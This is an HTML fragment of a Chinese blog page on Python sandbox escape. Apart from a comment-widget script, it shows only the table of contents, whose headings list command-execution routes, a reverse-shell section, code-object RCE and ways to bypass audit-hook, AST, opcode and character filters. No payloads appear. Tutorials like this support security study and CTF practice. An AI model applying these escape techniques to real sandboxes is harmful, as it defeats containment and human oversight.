                'data-repo-id': 'R_kgDONL9k_w',
                'data-category': 'Announcements',
                'data-category-id': 'DIC_kwDONL9k_84CkEdK',
                'data-mapping': 'pathname',
                'data-strict': '0',
                'data-reactions-enabled': '1',
                'data-emit-metadata': '1',
                'data-theme': 'preferred_color_scheme',
                'data-lang': 'zh-CN',
                'data-input-position': 'bottom',
                'data-loading': 'lazy',
                'crossorigin': 'anonymous',
                'async': true
            }
            const giscusScript = document.createElement('script');
            for (const key in giscusConfig) {
                giscusScript.setAttribute(key, giscusConfig[key]);
            }
            document.getElementById('giscus-container').appendChild(giscusScript);
        }
        if ('true') {
            let loadGiscusTimeout = setTimeout(() => {
                loadGiscus();
                clearTimeout(loadGiscusTimeout);
            }, 1000);
        } else {
            document.addEventListener('DOMContentLoaded', loadGiscus);
        }
    </script>


        
        
    
</div>

		</div>
		
	</div>

	
	<div class="toc-content-container">
		<div class="post-toc-wrap">
	<div class="post-toc">
		<div class="toc-title">On this page</div>
		<div class="page-title">Python 沙箱逃逸</div>
		<ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Python-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="nav-text">Python 基础知识</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Python-%E7%A8%8B%E5%BA%8F%E7%BB%93%E6%9E%84"><span class="nav-text">Python 程序结构</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A8%A1%E5%9D%97%EF%BC%88Module%EF%BC%89"><span class="nav-text">模块（Module）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8C%85%EF%BC%88Package%EF%BC%89"><span class="nav-text">包（Package）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%91%BD%E5%90%8D%E7%A9%BA%E9%97%B4%EF%BC%88Namespace%EF%BC%89"><span class="nav-text">命名空间（Namespace）</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#builtins-%E6%A8%A1%E5%9D%97"><span class="nav-text">builtins 模块</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF-builtins%EF%BC%9F"><span class="nav-text">什么是 builtins？</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#builtins-%E6%A8%A1%E5%9D%97%E5%86%85%E5%AE%B9"><span class="nav-text">builtins 模块内容</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%86%85%E7%BD%AE%E5%87%BD%E6%95%B0%EF%BC%88Built-in-Functions%EF%BC%89"><span class="nav-text">内置函数（Built-in Functions）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%86%85%E7%BD%AE%E7%B1%BB%E5%9E%8B%EF%BC%88Built-in-Types%EF%BC%89"><span class="nav-text">内置类型（Built-in Types）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%86%85%E7%BD%AE%E5%BC%82%E5%B8%B8%EF%BC%88Built-in-Exceptions%EF%BC%89"><span class="nav-text">内置异常（Built-in Exceptions）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%86%85%E7%BD%AE%E5%B8%B8%E9%87%8F%EF%BC%88Built-in-Constants%EF%BC%89"><span class="nav-text">内置常量（Built-in Constants）</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8%E5%9C%BA%E6%99%AF"><span class="nav-text">使用场景</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8A%A8%E6%80%81%E4%BF%AE%E6%94%B9%E5%86%85%E7%BD%AE%E5%87%BD%E6%95%B0"><span class="nav-text">动态修改内置函数</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%8E%A7%E5%88%B6%E5%8F%AF%E7%94%A8%E7%9A%84%E5%86%85%E7%BD%AE%E5%87%BD%E6%95%B0"><span class="nav-text">控制可用的内置函数</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%86%85%E7%9C%81%E6%9C%BA%E5%88%B6%EF%BC%88Introspection%EF%BC%89"><span class="nav-text">内省机制（Introspection）</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AF%B9%E8%B1%A1%E7%9A%84%E7%B1%BB%E5%9E%8B-%E7%BB%93%E6%9E%84"><span class="nav-text">对象的类型&#x2F;结构</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E5%AF%B9%E8%B1%A1%E6%88%90%E5%91%98"><span class="nav-text">获取对象成员</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%91%BD%E5%90%8D%E7%A9%BA%E9%97%B4%E4%B8%8E%E4%BD%9C%E7%94%A8%E5%9F%9F"><span class="nav-text">命名空间与作用域</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%87%E6%A1%A3%E4%B8%8E%E5%B8%AE%E5%8A%A9"><span class="nav-text">文档与帮助</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#inspect-%E6%A8%A1%E5%9D%97"><span class="nav-text">inspect 模块</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95-%E5%B1%9E%E6%80%A7"><span class="nav-text">魔术方法 &#x2F; 属性</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A8%A1%E5%9D%97-%E4%BD%9C%E7%94%A8%E5%9F%9F%E7%9B%B8%E5%85%B3"><span class="nav-text">模块 &#x2F; 作用域相关</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#builtins"><span class="nav-text">__builtins__</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#import"><span class="nav-text">__import__</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#dict"><span class="nav-text">__dict__</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#class"><span class="nav-text">__class__</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#bases"><span class="nav-text">__bases__</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#mro"><span class="nav-text">__mro__</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#subclasses"><span class="nav-text">__subclasses__()</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%87%BD%E6%95%B0-%E6%96%B9%E6%B3%95%E7%9A%84%E6%89%A7%E8%A1%8C%E7%8E%AF%E5%A2%83"><span class="nav-text">函数 &#x2F; 方法的执行环境</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#globals"><span class="nav-text">__globals__</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#init"><span class="nav-text">__init__</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%B1%9E%E6%80%A7%E8%8E%B7%E5%8F%96-%E8%AE%BE%E7%BD%AE"><span class="nav-text">属性获取 &#x2F; 设置</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#getattribute-name"><span class="nav-text">__getattribute__(name)</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#getattr-name"><span class="nav-text">__getattr__(name)</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#getitem-key"><span class="nav-text">__getitem__(key)</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#dir"><span class="nav-text">__dir__()</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8%E7%9B%AE%E6%A0%87"><span class="nav-text">沙箱逃逸目标</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="nav-text">命令执行</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#builtin-%E6%A8%A1%E5%9D%97"><span class="nav-text">builtin 模块</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#exec%EF%BC%88%E6%89%A7%E8%A1%8C-Python-%E4%BB%A3%E7%A0%81%E5%AD%97%E7%AC%A6%E4%B8%B2%EF%BC%89"><span class="nav-text">exec（执行 Python 代码字符串）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#eval%EF%BC%88%E6%B1%82%E5%80%BC%E8%A1%A8%E8%BE%BE%E5%BC%8F%EF%BC%89"><span class="nav-text">eval（求值表达式）</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#os-%E6%A8%A1%E5%9D%97"><span class="nav-text">os 模块</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#system-popen-%E7%B3%BB%E5%88%97%EF%BC%88%E6%9C%80%E7%9B%B4%E8%A7%82%EF%BC%89"><span class="nav-text">system &#x2F; popen 系列（最直观）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#spawn-posix-spawn-%E7%B3%BB%E5%88%97%EF%BC%88%E7%9B%B4%E6%8E%A5%E8%BF%90%E8%A1%8C%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6%EF%BC%89"><span class="nav-text">spawn &#x2F; posix_spawn 系列（直接运行可执行文件）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#exec-%E7%B3%BB%E5%88%97%EF%BC%88%E6%9B%BF%E6%8D%A2%E5%BD%93%E5%89%8D%E8%BF%9B%E7%A8%8B%EF%BC%89"><span class="nav-text">exec* 系列（替换当前进程）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#fork-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%EF%BC%88%E5%AD%90%E8%BF%9B%E7%A8%8B%E8%BF%90%E8%A1%8C%EF%BC%89"><span class="nav-text">fork + 命令执行（子进程运行）</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#subprocess-%E6%A8%A1%E5%9D%97"><span class="nav-text">subprocess 模块</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Popen-%E7%B3%BB%E5%88%97%EF%BC%88%E5%BA%95%E5%B1%82%E6%9E%84%E9%80%A0%EF%BC%8C%E7%81%B5%E6%B4%BB%E5%BA%A6%E6%9C%80%E9%AB%98%EF%BC%89"><span class="nav-text">Popen 系列（底层构造，灵活度最高）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%98%BB%E5%A1%9E%E6%89%A7%E8%A1%8C%E5%B9%B6%E8%8E%B7%E5%8F%96%E7%8A%B6%E6%80%81-%E8%BE%93%E5%87%BA"><span class="nav-text">阻塞执行并获取状态&#x2F;输出</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ctypes-%E6%A8%A1%E5%9D%97"><span class="nav-text">ctypes 模块</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Linux"><span class="nav-text">Linux</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Windows"><span class="nav-text">Windows</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#timeit-%E6%A8%A1%E5%9D%97"><span class="nav-text">timeit 模块</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#platform-%E6%A8%A1%E5%9D%97"><span class="nav-text">platform 模块</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#pty-%E6%A8%A1%E5%9D%97"><span class="nav-text">pty 模块</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#posixsubprocess-%E6%A8%A1%E5%9D%97"><span class="nav-text">_posixsubprocess 模块</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%8D%E5%BC%B9-shell"><span class="nav-text">反弹 shell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9E%84%E9%80%A0%E4%BB%A3%E7%A0%81%E5%AF%B9%E8%B1%A1%E8%BF%9B%E8%A1%8C-RCE"><span class="nav-text">构造代码对象进行 RCE</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%89%A7%E8%A1%8C-CodeType-%E5%AF%B9%E8%B1%A1"><span class="nav-text">执行 CodeType 对象</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9B%BF%E6%8D%A2%E5%87%BD%E6%95%B0%E7%9A%84-code"><span class="nav-text">替换函数的 code</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9E%84%E9%80%A0%E6%96%B0%E7%9A%84-CodeType-%E5%AF%B9%E8%B1%A1"><span class="nav-text">构造新的 CodeType 对象</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%AF%BB%E5%86%99%E6%96%87%E4%BB%B6"><span class="nav-text">读写文件</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#file-%E7%B1%BB"><span class="nav-text">file 类</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#open-%E5%87%BD%E6%95%B0"><span class="nav-text">open 函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#codecs-%E6%A8%A1%E5%9D%97"><span class="nav-text">codecs 模块</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#get-data-%E5%87%BD%E6%95%B0"><span class="nav-text">get_data 函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#linecache-%E6%A8%A1%E5%9D%97"><span class="nav-text">linecache 模块</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#license-%E5%87%BD%E6%95%B0"><span class="nav-text">license 函数</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%9E%9A%E4%B8%BE%E7%9B%AE%E5%BD%95"><span class="nav-text">枚举目录</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#os-%E6%A8%A1%E5%9D%97-1"><span class="nav-text">os 模块</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#glob-%E6%A8%A1%E5%9D%97"><span class="nav-text">glob 模块</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E5%87%BD%E6%95%B0%E4%BF%A1%E6%81%AF"><span class="nav-text">获取函数信息</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E6%BA%90%E4%BB%A3%E7%A0%81%E4%B8%AD%E7%9A%84%E5%B8%B8%E9%87%8F"><span class="nav-text">获取源代码中的常量</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E5%8F%98%E9%87%8F"><span class="nav-text">获取变量</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E5%87%BD%E6%95%B0%E5%AD%97%E8%8A%82%E7%A0%81%E5%BA%8F%E5%88%97"><span class="nav-text">获取函数字节码序列</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E7%8E%AF%E5%A2%83%E4%BF%A1%E6%81%AF"><span class="nav-text">获取环境信息</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96-python-%E7%89%88%E6%9C%AC"><span class="nav-text">获取 python 版本</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#sys-%E6%A8%A1%E5%9D%97"><span class="nav-text">sys 模块</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#platform-%E6%A8%A1%E5%9D%97-1"><span class="nav-text">platform 模块</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96-linux-%E7%89%88%E6%9C%AC"><span class="nav-text">获取 linux 版本</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#platform-%E6%A8%A1%E5%9D%97-2"><span class="nav-text">platform 模块</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E8%B7%AF%E5%BE%84"><span class="nav-text">获取路径</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F"><span class="nav-text">获取全局变量</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#globals-%E5%87%BD%E6%95%B0"><span class="nav-text">globals 函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#help-%E5%87%BD%E6%95%B0"><span class="nav-text">help 函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#vars-%E5%87%BD%E6%95%B0"><span class="nav-text">vars 函数</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E6%A8%A1%E5%9D%97%E5%86%85%E9%83%A8%E5%87%BD%E6%95%B0%E6%88%96%E5%8F%98%E9%87%8F"><span class="nav-text">获取模块内部函数或变量</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E6%8C%87%E5%AE%9A%E6%A8%A1%E5%9D%97%E5%86%85%E9%83%A8%E5%8F%98%E9%87%8F"><span class="nav-text">获取指定模块内部变量</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96-main-%E4%B8%AD%E5%8F%98%E9%87%8F"><span class="nav-text">获取 __main__ 中变量</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%8E%B7%E5%8F%96%E5%91%BD%E4%BB%A4%E7%A9%BA%E9%97%B4%E4%B8%AD%E7%9A%84%E5%8F%98%E9%87%8F-%E6%A8%A1%E5%9D%97-%E5%87%BD%E6%95%B0%E7%AD%89"><span class="nav-text">获取命令空间中的变量&#x2F;模块&#x2F;函数等</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%B8%B8%E8%A7%81%E6%B2%99%E7%AE%B1"><span class="nav-text">常见沙箱</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#exec-%E6%89%A7%E8%A1%8C"><span class="nav-text">exec 执行</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#eval-%E6%89%A7%E8%A1%8C"><span class="nav-text">eval 执行</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9F%BA%E4%BA%8E-audit-hook-%E7%9A%84%E6%B2%99%E7%AE%B1"><span class="nav-text">基于 audit hook 的沙箱</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#sys-addaudithook-%E6%9E%84%E5%BB%BA%E6%B2%99%E7%AE%B1"><span class="nav-text">sys.addaudithook 构建沙箱</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#PySys-AddAuditHook-%E6%9E%84%E5%BB%BA%E6%B2%99%E7%AE%B1"><span class="nav-text">PySys_AddAuditHook 构建沙箱</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9F%BA%E4%BA%8E-AST-%E7%9A%84%E6%B2%99%E7%AE%B1"><span class="nav-text">基于 AST 的沙箱</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9F%BA%E4%BA%8E-opcode-%E7%9A%84%E6%B2%99%E7%AE%B1"><span class="nav-text">基于 opcode 的沙箱</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AD%97%E8%8A%82%E7%A0%81%E6%A6%82%E5%BF%B5"><span class="nav-text">字节码概念</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B2%99%E7%AE%B1%E7%A4%BA%E4%BE%8B"><span class="nav-text">沙箱示例</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%BB%95%E8%BF%87%E5%88%A0%E9%99%A4%E6%A8%A1%E5%9D%97%E6%88%96%E6%96%B9%E6%B3%95"><span class="nav-text">绕过删除模块或方法</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#reload-%E9%87%8D%E6%96%B0%E5%8A%A0%E8%BD%BD"><span class="nav-text">reload 重新加载</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Python-2-%E4%B8%AD%E7%9A%84%E8%A1%8C%E4%B8%BA"><span class="nav-text">Python 2 中的行为</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Python-3-%E4%B8%AD%E7%9A%84%E8%A1%8C%E4%B8%BA"><span class="nav-text">Python 3 中的行为</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%81%A2%E5%A4%8D-sys-modules"><span class="nav-text">恢复 sys.modules</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8-globals-%E8%8E%B7%E5%8F%96-builtins-%E6%96%B9%E6%B3%95"><span class="nav-text">使用 globals() 获取 builtins 方法</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%A9%E7%94%A8-gc-%E8%8E%B7%E5%8F%96%E5%B7%B2%E5%88%A0%E9%99%A4%E6%A8%A1%E5%9D%97"><span class="nav-text">利用 gc 获取已删除模块</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%A9%E7%94%A8-traceback-%E8%8E%B7%E5%8F%96%E6%A8%A1%E5%9D%97"><span class="nav-text">利用 traceback 获取模块</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%BB%95%E8%BF%87%E5%9F%BA%E4%BA%8E%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%8C%B9%E9%85%8D%E7%9A%84%E8%BF%87%E6%BB%A4"><span class="nav-text">绕过基于字符串匹配的过滤</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%8F%98%E6%8D%A2"><span class="nav-text">字符串变换</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%8B%BC%E6%8E%A5"><span class="nav-text">字符串拼接</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#base64-%E5%8F%98%E5%BD%A2"><span class="nav-text">base64 变形</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%80%86%E5%BA%8F"><span class="nav-text">逆序</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%BF%9B%E5%88%B6%E8%BD%AC%E6%8D%A2"><span class="nav-text">进制转换</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%85%B6%E4%BB%96%E7%BC%96%E7%A0%81"><span class="nav-text">其他编码</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%BF%87%E6%BB%A4%E4%BA%86%E5%B1%9E%E6%80%A7%E5%90%8D%E6%88%96%E8%80%85%E5%87%BD%E6%95%B0%E5%90%8D"><span class="nav-text">过滤了属性名或者函数名</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#getattr-%E5%87%BD%E6%95%B0"><span class="nav-text">getattr 函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#getattribute-%E5%87%BD%E6%95%B0"><span class="nav-text">__getattribute__ 函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#getattr-%E5%87%BD%E6%95%B0-1"><span class="nav-text">__getattr__ 函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#globals-%E6%9B%BF%E6%8D%A2"><span class="nav-text">__globals__ 替换</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#mro-%E3%80%81-bases-%E3%80%81-base-%E4%BA%92%E6%8D%A2"><span class="nav-text">__mro__、__bases__、__base__ 互换</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%BF%87%E6%BB%A4-import"><span class="nav-text">过滤 import</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#import-1"><span class="nav-text">__import__</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#importlib-import-module"><span class="nav-text">importlib.import_module</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#loader-load-module"><span class="nav-text">__loader__.load_module</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%BF%87%E6%BB%A4%E4%BA%86"><span class="nav-text">过滤了 []</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#getitem"><span class="nav-text">__getitem__</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#pop"><span class="nav-text">pop</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%BF%87%E6%BB%A4%E4%BA%86-1"><span class="nav-text">过滤了 &#39;&#39;</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#str-%E5%87%BD%E6%95%B0"><span class="nav-text">str 函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#chr-%E5%87%BD%E6%95%B0"><span class="nav-text">chr 函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#list-dict-%E6%9E%84%E9%80%A0%E4%BB%BB%E6%84%8F%E5%AD%97%E7%AC%A6%E4%B8%B2"><span class="nav-text">list + dict 构造任意字符串</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#doc"><span class="nav-text">__doc__</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#bytes-%E5%87%BD%E6%95%B0"><span class="nav-text">bytes 函数</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%BF%87%E6%BB%A4%E4%BA%86-2"><span class="nav-text">过滤了 +</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%BF%87%E6%BB%A4%E4%BA%86%E6%95%B0%E5%AD%97"><span class="nav-text">过滤了数字</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%BF%87%E6%BB%A4%E4%BA%86%E7%A9%BA%E6%A0%BC"><span class="nav-text">过滤了空格</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%BF%87%E6%BB%A4%E4%BA%86%E8%BF%90%E7%AE%97%E7%AC%A6"><span class="nav-text">过滤了运算符</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9F%BA%E7%A1%80%E7%AD%89%E4%BB%B7%EF%BC%88%E5%80%BC%E7%AD%89%E4%BB%B7%E4%BD%86%E6%97%A0%E7%9F%AD%E8%B7%AF%EF%BC%89"><span class="nav-text">基础等价（值等价但无短路）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%80%BB%E8%BE%91%E5%80%BC%E2%80%9C%E8%BF%94%E5%9B%9E%E8%AF%AD%E4%B9%89%E2%80%9D%E5%A4%8D%E5%88%BB%EF%BC%88%E7%9F%AD%E8%B7%AF%E5%80%BC%E8%AF%AD%E4%B9%89%EF%BC%89"><span class="nav-text">逻辑值“返回语义”复刻（短路值语义）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E2%80%9Cnot%E2%80%9D-%E7%9A%84%E6%9B%BF%E4%BB%A3"><span class="nav-text">“not” 的替代</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E2%80%9C-%E2%80%9D-%E7%9A%84%E6%9B%BF%E4%BB%A3"><span class="nav-text">“&#x3D;&#x3D; &#x2F; !&#x3D;” 的替代</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BB%84%E5%90%88%E9%80%BB%E8%BE%91%E7%9A%84%E7%AD%89%E4%BB%B7"><span class="nav-text">组合逻辑的等价</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%86%85%E7%BD%AE%E5%87%BD%E6%95%B0%E6%9B%BF%E4%BB%A3"><span class="nav-text">内置函数替代</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%BF%87%E6%BB%A4%E4%BA%86-3"><span class="nav-text">过滤了 ()</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E8%A3%85%E9%A5%B0%E5%99%A8"><span class="nav-text">利用装饰器 @</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95"><span class="nav-text">利用魔术方法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BD%BF%E7%94%A8%E4%B8%8A%E4%B8%8B%E6%96%87%E7%AE%A1%E7%90%86%E5%99%A8-with"><span class="nav-text">使用上下文管理器 with</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#f-%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%89%A7%E8%A1%8C"><span class="nav-text">f 字符串执行</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%BB%95%E8%BF%87"><span class="nav-text">反序列化绕过</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E8%BF%87%E6%BB%A4%E4%BA%86%E5%86%85%E5%BB%BA%E5%87%BD%E6%95%B0"><span class="nav-text">过滤了内建函数</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#eval-list-dict-%E6%9E%84%E9%80%A0"><span 